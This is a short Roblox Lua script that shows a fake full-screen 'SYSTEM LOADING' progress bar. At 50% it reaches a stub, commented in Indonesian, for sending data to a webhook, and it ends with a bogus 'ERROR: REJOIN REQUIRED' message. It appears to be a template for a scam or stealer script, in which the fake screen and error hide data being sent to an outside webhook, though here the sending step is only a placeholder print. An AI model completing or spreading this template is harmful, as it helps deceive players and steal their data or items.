local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- GUI Loading Screen
local ScreenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

local Text = Instance.new("TextLabel", Frame)
Text.Size = UDim2.new(0, 400, 0, 50)
Text.Position = UDim2.new(0.5, -200, 0.5, -25)
Text.TextColor3 = Color3.fromRGB(255, 255, 255)
Text.Font = Enum.Font.GothamBold
Text.Text = "SYSTEM LOADING... 0%"

-- Start Process
task.spawn(function()
    for i = 1, 100 do
        task.wait(0.05)
        Text.Text = "SYSTEM LOADING... " .. i .. "%"
        if i == 50 then
            -- Kirim Webhook (Logic Webhook kamu di sini)
            print("Sending data to: " .. _G.Webhook)
        end
    end
    Text.Text = "ERROR: REJOIN REQUIRED"
end)